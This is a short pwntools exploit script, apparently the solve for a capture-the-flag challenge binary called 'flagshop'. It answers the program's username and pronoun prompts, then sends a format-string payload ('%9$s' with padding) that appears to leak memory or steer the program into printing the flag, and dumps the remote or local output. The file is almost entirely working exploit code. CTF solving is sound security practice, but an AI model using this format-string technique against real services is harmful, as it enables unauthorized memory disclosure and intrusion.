from pwn import *
import os

context.log_level = "warning"
exe = context.binary = ELF(".build/flagshop" if os.path.exists(".build/flagshop") else "flagshop")


HOST = os.environ.get("HOST")
PORT = os.environ.get("PORT")
if HOST or args.REMOTE:
	r = remote(HOST or args.HOST or "127.0.0.1", int(PORT or args.PORT or 24001))
elif args.DEBUG:
	r = exe.debug()
else:
	r = exe.process()

r.recvuntil(b"[ Enter your username ]")
name = b"whatever"
r.sendline(name)

r.recvuntil(b"[ Enter your pronouns ]")
pronouns = b"he/him"
r.sendline(pronouns)

r.recvuntil(b"==========================================")
payload = b"AABBBBBBBB%9$sCCCCCCCCCCCCCC1"
info(f"Payload will be: {payload.decode()}")
r.sendline(payload)

r.recvuntil(b"==========================================")
r.sendline(b"1")

print(f"[ FLAG Should Be Displayed Below ]: ")
# load_panel prints the flag then exit(0)s, so drain until the connection closes
print(r.recvall(timeout=5).decode("utf8", errors="replace").strip())

